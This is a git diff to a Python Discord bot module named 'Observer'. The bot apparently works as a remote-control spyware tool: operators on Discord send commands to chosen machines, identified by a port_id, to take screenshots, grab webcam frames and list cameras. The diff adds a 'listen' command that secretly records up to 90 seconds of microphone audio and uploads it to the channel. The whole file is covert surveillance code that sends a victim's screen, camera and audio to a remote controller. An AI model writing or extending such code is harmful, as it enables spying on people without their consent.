@@ -1,11 +1,14 @@
 import io
 import cv2
+import wave
 import asyncio
+import pyaudio
 import discord
 import numpy as np
 from mss import mss
 from PIL import Image
 from discord.ext import commands
+from module import CHUNK, FORMAT, CHANNELS, RATE, AMPLIFICATION_FACTOR
 
 class Observer(commands.Cog):
     def __init__(self, app: commands.Bot):
@@ -13,21 +16,26 @@ class Observer(commands.Cog):
         self.cam_lock = asyncio.Lock()
 
     @commands.command(name="screenshot", aliases=["ss", "capture"])
-    async def take_screenshot(self, ctx):
-        if not getattr(self.bot, 'is_selected', False):
-            return
-
-        await self.process_screenshot(ctx)
-
-    @commands.command(name="ssrun", aliases=["screenshotrun", "cprun"])
-    async def run_screenshot(self, ctx, target_id: str):
+    async def take_screenshot(self, ctx, arg: str = None):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
 
         if not getattr(self.bot, 'is_selected', False):
             return
+        
+        should_run = False
+        target_id = None
+        if arg is None:
+            pass
+        else:
+            target_id = arg
 
-        if target_id != my_id:
-            return
+        if target_id is None:
+            should_run = True
+        elif target_id == my_id:
+            should_run = True
+
+        if not should_run:
+            return    
 
         await self.process_screenshot(ctx)
 
@@ -72,27 +80,36 @@ class Observer(commands.Cog):
                 await ctx.send(f"**[{my_id}]** Error: {e}")
 
     @commands.command(name="webcam", aliases=["cam"])
-    async def take_webcam(self, ctx, num: int = 1):
-        if not getattr(self.bot, 'is_selected', False):
-            return
-        
-        await self.process_webcam(ctx, num)
-
-    @commands.command(name="camrun")
-    async def run_webcam(self, ctx, target_id: str, num: int = 1):
+    async def take_webcam(self, ctx, arg: str = None, num: int = 1):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
 
         if not getattr(self.bot, 'is_selected', False):
             return
         
-        if target_id != my_id:
-            return
+        should_run = False
+        target_id = None
+        webcam_num = 1
+        if arg is None:
+            pass
+        elif arg.isdigit():
+            webcam_num = int(arg)
+        else:
+            target_id = arg
+            webcam_num = num
 
-        await self.process_webcam(ctx, num)
-    
+        if target_id is None:
+            should_run = True
+        elif target_id == my_id:
+            should_run = True
+
+        if not should_run:
+            return    
+        
+        await self.process_webcam(ctx, webcam_num)
+
     # TODO: Fix Camera index out Issue
     @commands.command(name="camlist", aliases=["cams"])
-    async def list_webcams(self, ctx, arg1: str = None, arg2: int = 1):    
+    async def list_webcams(self, ctx, arg1: str = None, num: int = 1):    
 
         my_id = getattr(self.bot, 'port_id', 'Unknown')  
 
@@ -108,7 +125,7 @@ class Observer(commands.Cog):
             scan_num = int(arg1)
         else:
             target_id = arg1
-            scan_num = int(arg2)
+            scan_num = num
 
         if target_id is None:
             should_run = True
@@ -127,9 +144,9 @@ class Observer(commands.Cog):
                         cap = cv2.VideoCapture(idx, cv2.CAP_ANY)
                         if cap.isOpened():
                             ret, frame = cap.read()
-                            print(cap, ret)
+
                             width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
-                            hight = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                                 
                             status = ""
                             if ret and np.sum(frame) > 0:
@@ -139,7 +156,7 @@ class Observer(commands.Cog):
                             else:
                                 status = "**Error**"
 
-                            report.append(f"**Index {idx}:** {status} `({width}x{hight})`")
+                            report.append(f"**{idx+1}**. {status} `({width}x{height})`")
                             found_count += 1
                             cap.release() 
                     if not report:
@@ -179,6 +196,8 @@ class Observer(commands.Cog):
                             cap = cv2.VideoCapture(target_index)
                             if not cap.isOpened():
                                 return None, "Camera not found."
+                            
+                        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
 
                         resolutions = [
                             (3840, 2160), # 4K
@@ -211,7 +230,7 @@ class Observer(commands.Cog):
                             if np.sum(temp_frame) > 0:
                                 break
                         
-                        for _ in range(5): cap.read()
+                        for _ in range(10): cap.read()
 
                         ret, frame = cap.read()
                         cap.release()
@@ -240,6 +259,92 @@ class Observer(commands.Cog):
 
                 except Exception as e:
                     await ctx.send(f"**[{my_id}]** System Error: {e}")
+
+    @commands.command(name="listen", aliases=["mic", "audio"])
+    async def record_audio(self, ctx, arg: str = None, seconds: int = 10):
+
+        my_id = getattr(self.bot, 'port_id', 'Unknown')  
+
+        if not getattr(self.bot, 'is_selected', False):
+            return
+
+        if (seconds > 90) or (arg and arg.isdigit() and int(arg) > 90):
+            await ctx.send("❌ The maximum allowed duration is 90 seconds.")
+            return
+        
+        should_run = False
+        target_id = None
+        second = 10
+        if arg is None:
+            pass
+        elif arg.isdigit():
+            second = int(arg)
+        else:
+            target_id = arg
+            second = seconds
+
+        if target_id is None:
+            should_run = True
+        elif target_id == my_id:
+            should_run = True
+
+        if not should_run:
+            return    
+        
+        await self.process_record(ctx, second)
+
+    async def process_record(self, ctx, seconds: int):
+        my_id = getattr(self.bot, 'port_id', 'Unknown')
+        await ctx.send(f"**[{my_id}]** Listening for {seconds}s...")
+
+        async with ctx.typing():
+            try:
+                def record_to_ram():
+                    audio = pyaudio.PyAudio()
+                    try:
+                        stream = audio.open(
+                            format=FORMAT,
+                            channels=CHANNELS,
+                            rate=RATE,
+                            input=True,
+                            frames_per_buffer=CHUNK)
+                    except OSError:
+                        return None, "Microphone not found or access denied."
+
+                    frames = []
+                    
+                    for _ in range(0, int(RATE / CHUNK * seconds)):
+                        data = stream.read(CHUNK, exception_on_overflow=False)
+                        audio_data = np.frombuffer(data, dtype=np.int16)
+                        amplified = np.clip(audio_data * AMPLIFICATION_FACTOR, -32768, 32767)
+                        frames.append(amplified.astype(np.int16).tobytes())
+                        
+                    stream.stop_stream()
+                    stream.close()
+                    audio.terminate()
+                    
+                    audio_buffer = io.BytesIO()
+                    with wave.open(audio_buffer, 'wb') as wf:
+                        wf.setnchannels(CHANNELS)
+                        wf.setsampwidth(audio.get_sample_size(FORMAT))
+                        wf.setframerate(RATE)
+                        wf.writeframes(b''.join(frames))
+                    
+                    audio_buffer.seek(0) 
+                    return audio_buffer, "Success"
+
+                loop = asyncio.get_running_loop()
+                audio_data, msg = await loop.run_in_executor(None, record_to_ram)
+
+                if audio_data:
+                    file = discord.File(fp=audio_data, filename=f"audio_{my_id}.wav")
+                    await ctx.send(f"**[{my_id}]** Audio Clip Captured.", file=file)
+                    audio_data.close() 
+                else:
+                    await ctx.send(f"**[{my_id}]** Error: {msg}")
+
+            except Exception as e:
+                await ctx.send(f"**[{my_id}]** Mic Error: {e}")
 
 async def setup(app: commands.Bot):
     await app.add_cog(Observer(app))
